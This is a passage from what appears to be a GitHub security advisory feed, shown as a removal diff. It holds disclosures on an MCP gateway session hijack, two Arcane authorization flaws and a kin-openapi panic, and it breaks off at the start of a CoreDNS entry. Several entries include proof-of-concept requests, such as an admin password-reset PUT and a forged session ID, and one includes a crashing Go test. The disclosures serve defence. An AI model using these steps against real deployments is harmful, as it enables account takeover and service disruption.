-and at least one backend MCP server, using the Helm chart's default
-<code>values.yaml</code> (<code>controller.mcp.sessionEncryption.seed</code> left at
-<code>"default-insecure-seed"</code>).</li>
-<li>User A authenticates with a valid JWT (<code>sub: user-a</code>) and sends an
-<code>initialize</code> JSON-RPC request to the route. The gateway creates backend
-session(s) and returns <code>Mcp-Session-Id: &lt;encrypted-blob-A&gt;</code>, whose plaintext
-is <code>{route}@user-a@{backend}:{base64(sessionID)}:{capHex}</code>.</li>
-<li>Attacker (any other authenticated user, or — since the seed is public and
-default — even without ever having a legitimate session at all) constructs
-<code>{route}@user-a@{backend}:{base64(&lt;any-or-known-backend-session-id&gt;)}:fff</code>,
-derives the AES-GCM key via PBKDF2(sha256, "default-insecure-seed",
-salt, 100000, 32) for a salt of their choosing, and encrypts it themselves
-to produce a session ID that decrypts to the same structure <code>sessionFromID</code>
-expects.</li>
-<li>Attacker sends a subsequent JSON-RPC request (e.g. <code>tools/call</code>) to the same
-route with header <code>Mcp-Session-Id: &lt;forged-or-captured-blob-A&gt;</code>. The gateway
-decrypts it, extracts <code>perBackendSessionIDs</code> for <code>backend</code>, and forwards the
-attacker's call using that backend session — with no comparison to the
-attacker's own JWT subject at any point in <code>sessionFromID</code> /
-<code>backendSessionIDs()</code>.</li>
-</ol>
-<h2 id="suggested-fix">Suggested fix</h2>
-<ul>
-<li>In <code>sessionFromID</code>, thread the current request's <code>extractSubject(r)</code> value
-through to <code>backendSessionIDs()</code> (or a wrapping call) and reject resumption
-(401/403) when the decrypted subject does not match the current caller's
-subject — restoring the anti-hijacking check the embedding was built for.</li>
-<li>Independently, change the Helm chart's default
-<code>controller.mcp.sessionEncryption.seed</code> to be randomly generated per
-install (e.g. via a Helm <code>lookup</code>/<code>randAlphaNum</code> in a pre-install hook, or a
-required value with no default), rather than shipping a literal, fixed
-string. At minimum, fail startup (rather than just logging) when the seed
-equals the documented insecure default in a non-dev/insecure-allowed mode.</li>
-</ul>
-<h2 id="detected-by">Detected by</h2>
-<p>Aeon vuln-scanner — agentic dataflow review (<code>internal/mcpproxy</code> entrypoint,
-Envoy AI Gateway data-plane MCP proxy), followed by manual adversarial
-verification against the exact HEAD commit of <code>main</code>
-(<code>472da7db7984f769c9a77671d12c0354e75fc3ba</code>, confirmed to match
-<code>repos/theagentrouter/agent-router/commits/main</code> at time of report).
-Dependency-CVE findings from this scan (osv-scanner, <code>go.mod</code>/<code>package-lock.json</code>)
-are not included here — they are all already covered by open Dependabot PRs
-(#2555, #2643, #2672, #2497, #2615) and are omitted to avoid duplicate filings.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/theagentrouter/agent-router/security/advisories/GHSA-953h-535j-jg2v">https://github.com/theagentrouter/agent-router/security/advisories/GHSA-953h-535j-jg2v</a></li>
-<li><a href="https://github.com/theagentrouter/agent-router/pull/2740">https://github.com/theagentrouter/agent-router/pull/2740</a></li>
-<li><a href="https://github.com/theagentrouter/agent-router/pull/2755">https://github.com/theagentrouter/agent-router/pull/2755</a></li>
-<li><a href="https://github.com/theagentrouter/agent-router/commit/0d1e73037076d72251342d0ea578a36ffb7002c7">https://github.com/theagentrouter/agent-router/commit/0d1e73037076d72251342d0ea578a36ffb7002c7</a></li>
-<li><a href="https://github.com/theagentrouter/agent-router/commit/994579660ae2a9f2feef3cb77766e155746858b4">https://github.com/theagentrouter/agent-router/commit/994579660ae2a9f2feef3cb77766e155746858b4</a></li>
-<li><a href="https://github.com/advisories/GHSA-953h-535j-jg2v">https://github.com/advisories/GHSA-953h-535j-jg2v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-953h-535j-jg2v</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-19T16:53:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/getarcaneapp/arcane/backend/v2] Arcane: Delegated users:update permission allows admin account takeover via password reset (no privilege-hierarchy check)]]></title>
-        <id>https://github.com/advisories/GHSA-pw5q-rjx4-7f7p</id>
-        <link href="https://github.com/advisories/GHSA-pw5q-rjx4-7f7p"/>
-        <updated>2026-10-16T21:15:06.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>A user holding the delegated <code>users:update</code> permission can reset the global administrator's password and take over the admin account. <code>UpdateUser</code> sets the target user's <code>PasswordHash</code> from the request body for ANY target with no comparison of caller-vs-target privilege. Because role assignment and role CRUD are deliberately gated by <code>RequireGlobalAdmin</code>, <code>users:update</code> is intended to sit BELOW admin (profile management); this finding defeats that separation.</p>
-<h2 id="root-cause">Root Cause</h2>
-<p><code>UpdateUser</code> (handler <code>backend/api/handlers/users.go:317-323</code>) loads the target by ID and sets <code>userModel.PasswordHash</code> from the request body for any user, then <code>userService.UpdateUser</code> (<code>user_service.go:174</code>) simply <code>tx.Save</code>s — with NO actor-vs-target privilege comparison. The only <code>IsGlobalAdmin</code> guard (<code>user_service.go:345</code>) is a last-admin check inside <code>DeleteUser</code>, not the update path. Role assignment / role CRUD are <code>RequireGlobalAdmin</code> (<code>backend/pkg/authz/permissions.go:27-33</code>), proving <code>users:update</code> is intended below admin.</p>
-<h2 id="impact">Impact</h2>
-<p>Complete administrator account takeover (C:H/I:H/A:H) by any holder of the delegated <code>users:update</code> permission.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<ol>
-<li>Admin delegates a custom "User Manager" role with <code>users:update</code>.</li>
-<li><code>PUT /users/{adminId}</code> with <code>{"password":"attacker123"}</code>.</li>
-<li><code>POST /auth/login {"username":"arcane","password":"attacker123"}</code> → admin session.</li>
-</ol>
-<h2 id="attack-chain">Attack Chain</h2>
-<ol>
-<li>Action: admin delegates custom role with <code>users:update</code>. Guard: role creation is <code>RequireGlobalAdmin</code>. Bypass: intended delegation (holder is meant to manage profiles, not seize admin).</li>
-<li>Action: <code>PUT /users/{adminId}</code> <code>{"password":"attacker123"}</code>. Guard: <code>RequirePermission(users:update)</code> (<code>users.go:154</code>). Bypass: holder has it; no hierarchy check (<code>users.go:317-323</code>, <code>user_service.go:174</code> unconditional Save).</li>
-<li>Action: <code>POST /auth/login</code> as admin → admin session.</li>
-</ol>
-<h2 id="bypass-evidence">Bypass Evidence</h2>
-<ul>
-<li><code>users.go:317-323</code> sets <code>PasswordHash</code> for any target; <code>user_service.go:174-194</code> has no actor/target privilege comparison.</li>
-<li>Only <code>IsGlobalAdmin</code> hits are <code>DeleteUser</code>'s last-admin guard and DTO flags (grep).</li>
-<li><code>users:update</code> is org-level, held by no built-in non-admin role (<code>permissions.go:24</code>).</li>
-</ul>
-<h2 id="affected-versions">Affected Versions</h2>
-<p><code>&lt;= 2.5.0</code>.</p>
-<p>Reported by <strong>zx (Jace)</strong> — GitHub: @manus-use</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getarcaneapp/arcane/security/advisories/GHSA-pw5q-rjx4-7f7p">https://github.com/getarcaneapp/arcane/security/advisories/GHSA-pw5q-rjx4-7f7p</a></li>
-<li><a href="https://github.com/getarcaneapp/arcane/pull/3426">https://github.com/getarcaneapp/arcane/pull/3426</a></li>
-<li><a href="https://github.com/getarcaneapp/arcane/commit/21ea962f86d967dac8ae02a050f6e5f043d10fa1">https://github.com/getarcaneapp/arcane/commit/21ea962f86d967dac8ae02a050f6e5f043d10fa1</a></li>
-<li><a href="https://github.com/getarcaneapp/arcane/releases/tag/backend/v2.6.0">https://github.com/getarcaneapp/arcane/releases/tag/backend/v2.6.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-pw5q-rjx4-7f7p">https://github.com/advisories/GHSA-pw5q-rjx4-7f7p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pw5q-rjx4-7f7p</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-16T21:15:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/getarcaneapp/arcane/backend/v2] Arcane: Environment access token bypasses the admin-required authorization gate on `/api/debug/pprof`]]></title>
-        <id>https://github.com/advisories/GHSA-mp22-58ff-6fhr</id>
-        <link href="https://github.com/advisories/GHSA-mp22-58ff-6fhr"/>
-        <updated>2026-10-16T21:12:05.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Arcane v2.10.2 contains an authorization inconsistency in <code>AuthMiddleware.managerAuth</code>.</p>
-<p>When a request supplies a valid environment access token through the <code>X-Arcane-Agent-Token</code> header, <code>managerAuth</code> resolves the associated environment, installs an environment-scoped permission set, and immediately calls <code>next(c)</code>.</p>
-<p>This occurs before the middleware evaluates the <code>AdminRequired</code> option and verifies that the caller is a global administrator.</p>
-<p>As a result, an environment-scoped access token can access routes protected with <code>WithAdminRequired()</code>, despite the corresponding <code>EnvironmentPermissionSet</code> intentionally containing no global or sudo permissions.</p>
-<p>In v2.10.2, the affected admin-only surface is the manager's Go <code>pprof</code> diagnostic interface under:</p>
-<p><code>/api/debug/pprof/*</code></p>
-<p>This exposes diagnostic and runtime profiling information that the application explicitly intends to restrict to global administrators.</p>
-<p>The issue is an incorrect authorization vulnerability (CWE-863).</p>
-<h2 id="details">Details</h2>
-<h3 id="1-environment-access-tokens-are-accepted-by-the-manager-authentication-middleware">1. Environment access tokens are accepted by the manager authentication middleware</h3>
-<p>The production authentication middleware is configured with an environment access-token resolver:</p>
-<p><code>backend/internal/di/providers.go</code></p>
-<p>Conceptually, the middleware is constructed as:</p>
-<pre><code class="language-go">auth.NewAuthMiddleware(authService, cfg).
-    WithApiKeyValidator(apiKey).
-    WithEnvironmentAccessTokenResolver(env).
-    WithPermissionResolver(role)
-</code></pre>
-<p>Therefore, the <code>X-Arcane-Agent-Token</code> authentication path is active in the production manager.</p>
-<h3 id="2-the-environment-token-path-returns-before-authorization-options-are-evaluated">2. The environment-token path returns before authorization options are evaluated</h3>
-<p>The relevant logic is in:</p>
-<p><code>backend/internal/auth/middleware.go</code></p>
-<p><code>managerAuth</code> first checks the <code>X-Arcane-Agent-Token</code> header.</p>
-<p>When the token resolves to an environment, the middleware installs an environment-scoped permission set and immediately continues processing:</p>
-<pre><code class="language-go">if agentToken := req.Header.Get(utils.HeaderAgentToken); agentToken != "" {
-    if env, ok := m.resolveEnvironmentAccessToken(ctx, agentToken).Get(); ok {
-        environmentScopedInternal(c, env)
-        return next(c)
-    }
-}
-</code></pre>
-<p>The important part is the unconditional:</p>
-<pre><code class="language-go">return next(c)
-</code></pre>
-<p>The normal authentication path later evaluates the middleware's <code>AdminRequired</code> option:</p>
-<pre><code class="language-go">ps := m.resolvePermissionsOrDeny(ctx, user)
-
-if m.options.AdminRequired &amp;&amp; !ps.IsGlobalAdmin() {
-    return c.JSON(http.StatusForbidden, common.APIError{
-        Code:    "FORBIDDEN",
-        Message: "You don't have permission to access this resource",
-    })
-}
-</code></pre>
-<p>The environment-token branch never reaches this check.</p>
-<p>Consequently, <code>WithAdminRequired()</code> has no effect when authentication succeeds through a valid environment access token.</p>
-<p>This creates an authorization inconsistency between authentication mechanisms:</p>
-<ul>
-<li><p>normal user/session authentication → <code>AdminRequired</code> is enforced;</p>
-</li>
-<li><p>environment access-token authentication → <code>AdminRequired</code> is bypassed.</p>
-</li>
-</ul>
-<h3 id="3-environment-tokens-are-intentionally-not-global-administrator-credentials">3. Environment tokens are intentionally not global-administrator credentials</h3>
-<p><code>backend/pkg/authz/permission_set.go</code> defines the effective permissions assigned to an environment access token.</p>
-<p><code>EnvironmentPermissionSet(envID)</code> grants environment-scoped permissions only for the specified environment:</p>
-<pre><code class="language-go">func EnvironmentPermissionSet(envID string) *PermissionSet {
-    ps := NewPermissionSet()
-
-    if envID == "" {
-        return ps
-    }
-
-    for _, p := range AllPermissions() {
-        if IsEnvScoped(p) {
-            ps.AddEnv(envID, p)
-        }
-    }
-
-    return ps
-}
-</code></pre>
-<p>The implementation explicitly establishes that these credentials do not receive global or sudo permissions.</p>
-<p>Therefore, an environment access token should not satisfy a global-administrator authorization requirement.</p>
-<p>The early return in <code>managerAuth</code> bypasses this intended privilege boundary.</p>
-<h3 id="4-apidebugpprof-explicitly-requires-global-administrator-authorization">4. <code>/api/debug/pprof/*</code> explicitly requires global-administrator authorization</h3>
-<p>The diagnostic routes are registered in:</p>
-<p><code>backend/api/ws/diagnostics.go</code></p>
-<p>The <code>pprof</code> group is protected using:</p>
-<pre><code class="language-go">pprofGroup := group.Group(
-    "/debug/pprof",
-    authMiddleware.WithAdminRequired().Add(),
-)
-</code></pre>
-<p>The source also documents the intended authorization requirement by noting that pprof keeps the stricter admin-required gate.</p>
-<p>The group exposes handlers including:</p>
-<pre><code class="language-text">/api/debug/pprof/
-/api/debug/pprof/cmdline
-/api/debug/pprof/profile
-/api/debug/pprof/symbol
-/api/debug/pprof/trace
-/api/debug/pprof/heap
-/api/debug/pprof/goroutine
-/api/debug/pprof/allocs
-/api/debug/pprof/block
-/api/debug/pprof/mutex
-/api/debug/pprof/threadcreate
-</code></pre>
-<p>Named profiles are dispatched through <code>pprof.Handler</code>.</p>
-<p>Because <code>WithAdminRequired()</code> is bypassed by the environment-token branch, a valid environment access token can reach these handlers even though its permission set is not globally privileged.</p>
-<h3 id="5-other-middleware-does-not-restore-the-missing-authorization-check">5. Other middleware does not restore the missing authorization check</h3>
-<p>The CSRF middleware recognizes <code>X-Arcane-Agent-Token</code> as a header-based credential and does not apply the normal cross-origin CSRF validation to such requests.</p>
-<p>Additionally, the environment proxy middleware passes through requests that do not target an <code>/environments/{id}/...</code> path.</p>
-<p>Therefore a request to:</p>
-<pre><code class="language-text">/api/debug/pprof/*
-</code></pre>
-<p>can proceed to <code>managerAuth</code>, enter the environment-token authentication branch, and reach the pprof handler without another global-administrator authorization check being applied.</p>
-<h2 id="source-to-sink-authorization-path">Source-to-sink authorization path</h2>
-<p>The vulnerable control flow is:</p>
-<pre><code class="language-text">X-Arcane-Agent-Token
-        |
-        v
-environment access token resolver
-        |
-        v
-environment resolved successfully
-        |
-        v
-EnvironmentPermissionSet(environmentID)
-        |
-        v
-return next(c)
-        |
-        |  AdminRequired check is skipped
-        v
-/api/debug/pprof/*
-        |
-        v
-net/http/pprof handler
-</code></pre>
-<p>The security boundary violation occurs at the early <code>return next(c)</code>.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<h3 id="preconditions">Preconditions</h3>
-<p>The test requires:</p>
-<ol>
-<li><p>A valid Arcane environment access token.</p>
-</li>
-<li><p>An Arcane manager running the affected code.</p>
-</li>
-<li><p>No global-administrator account or credentials.</p>
-</li>
-</ol>
-<h3 id="test-1--environment-access-token">Test 1 — environment access token</h3>
-<p>Send a request to an admin-protected pprof endpoint using only an environment access token:</p>
-<pre><code class="language-http">GET /api/debug/pprof/heap?debug=1 HTTP/1.1
-Host: arcane.example.com
-X-Arcane-Agent-Token: &lt;VALID_ENVIRONMENT_ACCESS_TOKEN&gt;
-</code></pre>
-<p>No administrator session cookie or administrator Bearer token is supplied.</p>
-<h3 id="vulnerable-behavior">Vulnerable behavior</h3>
-<p>On an affected instance, the request is expected to reach the pprof handler instead of being rejected by <code>WithAdminRequired()</code>.</p>
-<p>A successful response demonstrates that the environment-token authentication branch bypasses the administrator requirement.</p>
-<p>For example, the response may contain the Go heap profiling output generated by <code>net/http/pprof</code>.</p>
-<h3 id="test-2--non-admin-user-contrast-case">Test 2 — non-admin user contrast case</h3>
-<p>Send the same request using a normal authenticated non-global-admin user:</p>
-<pre><code class="language-http">GET /api/debug/pprof/heap?debug=1 HTTP/1.1
-Host: arcane.example.com
-Authorization: Bearer &lt;NON_ADMIN_ACCESS_TOKEN&gt;
-</code></pre>
-<p>The expected result is:</p>
-<pre><code class="language-http">HTTP/1.1 403 Forbidden
-</code></pre>
-<p>with an authorization error indicating that the user does not have permission to access the resource.</p>
-<p>This contrast demonstrates the authorization inconsistency:</p>
-<pre><code class="language-text">environment-scoped token
-        -&gt; admin gate skipped
-        -&gt; pprof handler reached
-
-normal non-admin user
-        -&gt; admin gate evaluated
-        -&gt; HTTP 403
-</code></pre>
-<h3 id="expected-secure-behavior">Expected secure behavior</h3>
-<p>A valid environment access token should receive:</p>
-<pre><code class="language-http">HTTP/1.1 403 Forbidden
-</code></pre>
-<p>for every route protected with <code>WithAdminRequired()</code>.</p>
-<p>Only a caller whose effective permission set satisfies <code>IsGlobalAdmin()</code> should be allowed to access these routes.</p>
-<h2 id="impact">Impact</h2>
-<p>An attacker who obtains a valid environment access token can cross the intended authorization boundary between an individual environment and manager-wide administrative functionality.</p>
-<p>In the currently identified route configuration, this allows unauthorized access to the manager's Go <code>pprof</code> diagnostic endpoints.</p>
-<p>Depending on the requested profile, these endpoints can expose internal runtime and diagnostic information such as:</p>
-<ul>
-<li><p>goroutine stack traces;</p>
-</li>
-<li><p>function and package names;</p>
-</li>
-<li><p>allocation and heap profiling information;</p>
-</li>
-<li><p>CPU profiling information;</p>
-</li>
-<li><p>runtime execution traces;</p>
-</li>
-<li><p>process command-line information;</p>
-</li>
-<li><p>mutex, block, thread and allocation profiling data.</p>
-</li>
-</ul>
-<p>This information is normally restricted to global administrators by Arcane's explicit use of <code>WithAdminRequired()</code>.</p>
-<p>Some profiling operations may also impose additional CPU, memory, or tracing overhead while being collected.</p>
-<p>Importantly, this report does <strong>not</strong> assume that Go's pprof heap endpoint is an arbitrary raw-process-memory dump. Direct extraction of session tokens, environment access tokens, passwords, or other credentials from pprof output has not been demonstrated and is therefore not claimed as part of the confirmed impact.</p>
-<p>The confirmed security issue is the authorization bypass itself and the resulting unauthorized exposure of administrator-restricted diagnostic functionality.</p>
-<h2 id="root-cause">Root Cause</h2>
-<p>The root cause is that authentication through an environment access token takes an early-success path:</p>
-<pre><code class="language-go">environmentScopedInternal(c, env)
-return next(c)
-</code></pre>
-<p>before common middleware authorization options are evaluated.</p>
-<p>As a result, authorization requirements configured on the middleware are dependent on which authentication mechanism is used.</p>
-<p>Authentication establishes the identity and scope of the caller, but route-level authorization requirements such as <code>AdminRequired</code> should subsequently be applied consistently regardless of the authentication mechanism.</p>
-<h2 id="remediation">Remediation</h2>
-<p>The environment-token authentication path should not call <code>next(c)</code> before the configured authorization requirements have been evaluated.</p>
-<p>One approach is to resolve the environment token into its <code>EnvironmentPermissionSet</code> and then pass that permission set through the same authorization-option evaluation used by other authentication mechanisms.</p>
-<p>For example, logically:</p>
-<pre><code class="language-go">if envTokenIsValid {
-    ps := authz.EnvironmentPermissionSet(env.ID)
-
-    if m.options.AdminRequired &amp;&amp; !ps.IsGlobalAdmin() {
-        return forbidden
-    }
-
-    environmentScopedInternal(c, env)
-    return next(c)
-}
-</code></pre>
-<p>Because an <code>EnvironmentPermissionSet</code> intentionally has no global permissions, an environment token would then correctly receive HTTP 403 for <code>WithAdminRequired()</code> routes.</p>
-<p>As additional defense in depth, the pprof endpoints could explicitly reject environment access tokens and other environment-scoped authentication mechanisms, allowing access only through authentication mechanisms capable of representing a global administrator.</p>
-<p>It may also be worth considering whether pprof should be exposed in production by default or enabled only through an explicit diagnostic configuration option.</p>
-<h2 id="regression-tests">Regression Tests</h2>
-<p>The following cases should be covered:</p>
-<pre><code class="language-text">Valid environment access token
-+ /api/debug/pprof/heap
-=&gt; 403
-
-Normal authenticated non-admin user
-+ /api/debug/pprof/hea
-=&gt; 403
-
-Unauthenticated request
-+ /api/debug/pprof/heap
-=&gt; 401/403
-
-Global administrator
-+ /api/debug/pprof/heap
-=&gt; 200
-</code></pre>
-<p>More generally, tests should verify that every authentication mechanism is subject to middleware options such as <code>AdminRequired</code>.</p>
-<p>The issue could also broadly be categorized as an authorization-check bypass caused by inconsistent authorization handling across authentication paths..</p>
-<p>No claim of credential extraction, arbitrary process-memory disclosure, or global-administrator takeover is made unless separately demonstrated through dynamic testing.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getarcaneapp/arcane/security/advisories/GHSA-mp22-58ff-6fhr">https://github.com/getarcaneapp/arcane/security/advisories/GHSA-mp22-58ff-6fhr</a></li>
-<li><a href="https://github.com/getarcaneapp/arcane/pull/3881">https://github.com/getarcaneapp/arcane/pull/3881</a></li>
-<li><a href="https://github.com/getarcaneapp/arcane/commit/4fe4c7ed9483dff7d43e3c4bee6a92037ce886b4">https://github.com/getarcaneapp/arcane/commit/4fe4c7ed9483dff7d43e3c4bee6a92037ce886b4</a></li>
-<li><a href="https://github.com/getarcaneapp/arcane/releases/tag/backend/v2.11.0">https://github.com/getarcaneapp/arcane/releases/tag/backend/v2.11.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-mp22-58ff-6fhr">https://github.com/advisories/GHSA-mp22-58ff-6fhr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mp22-58ff-6fhr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-16T21:12:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/getkin/kin-openapi] kin-openapi openapi3filter: nil-pointer panic in ValidateResponse on a response header declared with content]]></title>
-        <id>https://github.com/advisories/GHSA-74vm-87hj-r66f</id>
-        <link href="https://github.com/advisories/GHSA-74vm-87hj-r66f"/>
-        <updated>2026-10-16T19:58:47.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>ValidateResponse</code> panics on a nil pointer when a spec declares a response header with <code>content</code> instead of <code>schema</code>. <code>doc.Validate()</code> accepts that document, so the crash comes from a spec the library just called valid.</p>
-<p>Same class as GHSA-jpcw-4wr7-c3vq, which covered the request-parameter case in v0.144.0; this is the response-header path.</p>
-<p>Affects <code>github.com/getkin/kin-openapi</code> <code>&lt;= v0.145.0</code>. Reproduced on master <code>947498e5a6bd</code>, Go 1.26.</p>
-<h2 id="details">Details</h2>
-<p>A <code>content</code>-typed response header has <code>headerRef.Value.Schema == nil</code>.</p>
-<p><code>validate_response.go:181</code> passes it straight through:</p>
-<pre><code class="language-go">if decodedValue, found, err = decodeValue(dec, headerName, sm, headerRef.Value.Schema, headerRef.Value.Required); err != nil {
-</code></pre>
-<p>and <code>req_resp_decoder.go:273</code> is where it lands:</p>
-<pre><code class="language-go">if len(schema.Value.AllOf) &gt; 0 {
-</code></pre>
-<p>Two things I checked rather than assumed. The response does not need to carry the header; declaring it is enough, and then every call for that operation panics. And the body path is fine, <code>:114</code> returns early on a nil schema, so this is headers only. The PoC keeps the body case as a control.</p>
-<h2 id="poc">PoC</h2>
-<p>Drop into <code>openapi3filter/</code> and run:</p>
-<pre><code>go test ./openapi3filter/ -run NilSchema -v
-</code></pre>
-<pre><code class="language-go">package openapi3filter_test
-
-import (
-    "context"
-    "io"
-    "net/http"
-    "net/http/httptest"
-    "strings"
-    "testing"
-
-    "github.com/getkin/kin-openapi/openapi3"
-    "github.com/getkin/kin-openapi/openapi3filter"
-    "github.com/getkin/kin-openapi/routers"
-)
-
-const specBody = `
-openapi: 3.0.3
-info: {title: poc, version: "1.0.0"}
-paths:
-  /x:
-    get:
-      responses:
-        "200":
-          description: ok
-          content:
-            application/json: {}
-`
-
-const specHeader = `
-openapi: 3.0.3
-info: {title: poc, version: "1.0.0"}
-paths:
-  /x:
-    get:
-      responses:
-        "200":
-          description: ok
-          headers:
-            X-Thing:
-              content:
-                application/json: {}
-`
-
-func validatedInput(t *testing.T, spec string, hdr http.Header) *openapi3filter.ResponseValidationInput {
-    t.Helper()
-    doc, err := openapi3.NewLoader().LoadFromData([]byte(spec))
-    if err != nil {
-        t.Fatalf("load: %v", err)
-    }
-    if err := doc.Validate(context.Background()); err != nil {
-        t.Fatalf("doc.Validate rejected the spec, so this repro proves nothing: %v", err)
-    }
-    op := doc.Paths.Find("/x").Get
-    req := httptest.NewRequest(http.MethodGet, "/x", nil)
-    return &amp;openapi3filter.ResponseValidationInput{
-        RequestValidationInput: &amp;openapi3filter.RequestValidationInput{
-            Request: req,
-            Route:   &amp;routers.Route{Spec: doc, Operation: op, Method: http.MethodGet, Path: "/x"},
-        },
-        Status: 200,
-        Header: hdr,
-        Body:   io.NopCloser(strings.NewReader(`{}`)),
-    }
-}
-
-// Control: body path returns early on a nil schema.
-func TestControl_ResponseBodyNilSchema(t *testing.T) {
-    in := validatedInput(t, specBody, http.Header{"Content-Type": {"application/json"}})
-    defer func() {
-        if r := recover(); r != nil {
-            t.Errorf("body path panicked, expected clean return: %v", r)
-        }
-    }()
-    if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
-        t.Errorf("body path returned %v, expected nil", err)
-    }
-}
-
-// The response does not carry X-Thing. Declaring the header is enough.
-func TestResponseHeaderNilSchema(t *testing.T) {
-    in := validatedInput(t, specHeader, http.Header{"Content-Type": {"application/json"}})
-    if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
-        t.Fatalf("no panic; got err = %v (already fixed?)", err)
-    }
-}
-</code></pre>
-<p>Output:</p>
-<pre><code>=== RUN   TestControl_ResponseBodyNilSchema
---- PASS: TestControl_ResponseBodyNilSchema (0.00s)
-=== RUN   TestResponseHeaderNilSchema
---- FAIL: TestResponseHeaderNilSchema (0.00s)
-panic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]
-[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x7f6d2a]
-
-github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
-    /src/openapi3filter/req_resp_decoder.go:273 +0x4a
-github.com/getkin/kin-openapi/openapi3filter.validateResponseHeader(...)
-    /src/openapi3filter/validate_response.go:181 +0x146
-github.com/getkin/kin-openapi/openapi3filter.ValidateResponse(...)
-    /src/openapi3filter/validate_response.go:89 +0xafa
-</code></pre>
-<p>The <code>FAIL</code> is the point: control passes, the header case takes the binary down.</p>
-<p>Ran in a container against a fresh clone of master. I have not tried it against a live proxy.</p>
-<h2 id="impact">Impact</h2>
-<p>A process crash instead of an error return. Declaring the header is enough, so it is every call on that operation rather than an occasional one.</p>
-<p>If the spec comes from somewhere else -- gateways, linters, anything ingesting specs it did not write -- that is a trust boundary, and it becomes remote availability.</p>
-<p>If it is your own spec, nothing attacker-controlled starts it, but any client reaching that route then crashes the process. It fires on every call, so normally you would see it the first time that route runs. A spec edited without exercising the route is the case where you would not. That is the difference from GHSA-jpcw, where the attacker supplied the trigger. I have left severity unset; the two cases do not score the same.</p>
-<p>On how common it is, I checked rather than guessed. Of roughly 1,500 OpenAPI 3.x specs on apis.guru, one declares content-typed response headers -- VTEX Catalog API -- and not in one corner of it: the shape repeats across its operations, so for that consumer this is not an edge case.</p>
-<p>The header names in it (<code>X-AspNet-Version</code>, <code>p3p</code>, a few malformed ones) look like a generator emitting <code>content</code> where it could not infer a schema, and apis.guru only indexes public specs. There is no content-typed response header in this repo's testdata either.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Use <code>schema</code> on the response header, or skip <code>ValidateResponse</code> for those operations. <code>ExcludeResponseBody</code> will not do it -- headers are validated before that check.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Nil-guard at the top of <code>decodeValue</code>:</p>
-<pre><code class="language-go">if schema == nil {
-    return nil, false, nil
-}
-</code></pre>
-<p>Returning nil leaves a <code>content</code>-typed header unvalidated rather than erroring, so it trades the crash for a silent gap. An error return kills the panic just as well if you would rather it surfaced.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/getkin/kin-openapi/security/advisories/GHSA-74vm-87hj-r66f">https://github.com/getkin/kin-openapi/security/advisories/GHSA-74vm-87hj-r66f</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-100349">https://nvd.nist.gov/vuln/detail/CVE-2026-100349</a></li>
-<li><a href="https://github.com/getkin/kin-openapi/commit/f5441d67f855ed34d975b3b85665764644ab1459">https://github.com/getkin/kin-openapi/commit/f5441d67f855ed34d975b3b85665764644ab1459</a></li>
-<li><a href="https://github.com/getkin/kin-openapi/releases/tag/v0.146.0">https://github.com/getkin/kin-openapi/releases/tag/v0.146.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-74vm-87hj-r66f">https://github.com/advisories/GHSA-74vm-87hj-r66f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-74vm-87hj-r66f</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-16T19:58:46.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/coredns/coredns] CoreDNS `k8s_external` headless AXFR can emit an empty transfer batch that panics the `transfer` plugin]]></title>
-        <id>https://github.com/advisories/GHSA-74w3-63xv-x9mv</id>
-        <link href="https://github.com/advisories/GHSA-74w3-63xv-x9mv"/>
-        <updated>2026-10-16T19:26:43.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A network DNS client allowed to request AXFR for a CoreDNS zone can trigger a panic when CoreDNS is configured with <code>k8s_external</code> headless-service zone transfers and Kubernetes contains a headless service endpoint with no declared ports. The built-in <code>k8s_external</code> transferer can emit an empty <code>[]dns.RR</code> batch, and the shared <code>transfer</code> plugin indexes <code>records[0]</code> without checking that the batch is non-empty. In normal CoreDNS mode the panic is recovered and returned as <code>SERVFAIL</code>, but repeated triggering can disrupt requests and amplify panic logging; if the <code>debug</code> plugin disables recovery, the same path can crash the CoreDNS process.</p>
-<h3 id="details">Details</h3>
